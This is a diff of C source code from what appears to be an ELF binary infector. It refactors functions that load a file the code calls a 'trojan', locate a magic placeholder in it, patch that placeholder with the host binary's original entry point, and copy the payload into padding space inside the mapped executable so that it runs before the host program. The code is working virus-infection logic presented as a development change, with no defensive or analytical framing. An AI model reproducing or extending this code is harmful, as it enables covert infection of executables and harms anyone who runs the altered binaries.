@@ -57,15 +57,26 @@ long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
     return NULL;
 }
 
-infect_t *inf_load(elf_t *elfo, FILE *infection, open_mode_t m) {
+infect_t *inf_load(elf_t *elfo, FILE *infection, open_mode_t m, long magic) {
     ASSERT_CON_RET_NULL(m == F_RW);
     ASSERT_ARG_RET_NULL(elfo);
-    infect_t *inf = scalloc(1, sizeof(infect_t));
     struct mapped_file file_data;
 
     bool rc = file_load_source(&file_data, infection);
-    ASSERT_ARG_RET_NULL(rc);
+    if (!rc) {
+        log_error("Can't load trojan file\n");
+        return NULL;
+    }
 
+    long *ptr = _inf_get_inf_magik((uint8_t*)file_data.infection,
+            file_data.st_infection.st_size, magic);
+    if (!ptr) {
+        log_error("Magic not found\n");
+        return NULL;
+    }
+
+    infect_t *inf = scalloc(1, sizeof(infect_t));
+    inf->magic_ptr = ptr;
     inf->elfo = elfo;
     inf->elfo->inf_size = file_data.st_infection.st_size;
     inf->elfo->infection = file_data.infection;
@@ -134,10 +145,9 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     return (pass_check ? inf->pad.inf_pading_size = len : 0);
 }
 
-bool inf_load_and_patch(infect_t *inf, long magic) {
+bool inf_load_and_patch(infect_t *inf) {
     ASSERT_CON_RET_FALSE(inf && inf->elfo);
 
-    bool rc = false;
     elf_ehdr_t *ehdr = inf->elfo->ehdr;
 
     elf_off_t curr_sct_offset = 0;
@@ -159,15 +169,12 @@ bool inf_load_and_patch(infect_t *inf, long magic) {
             break;
         }
     }
-    long *ptr = _inf_get_inf_magik((uint8_t*)inf->elfo->infection, inf->elfo->inf_size, magic);
-    if (ptr) {
-        /** All good! */
-        *(ptr) = inf->pad.original_e_entry;
-        unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.so_addr;
-        memcpy(dest, inf->elfo->infection, inf->elfo->inf_size);
-        rc = true;
-    }
 
-    return rc;
+    /** All good! */
+    *(inf->magic_ptr) = inf->pad.original_e_entry;
+    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.so_addr;
+    memcpy(dest, inf->elfo->infection, inf->elfo->inf_size);
+
+    return true;
 }
 
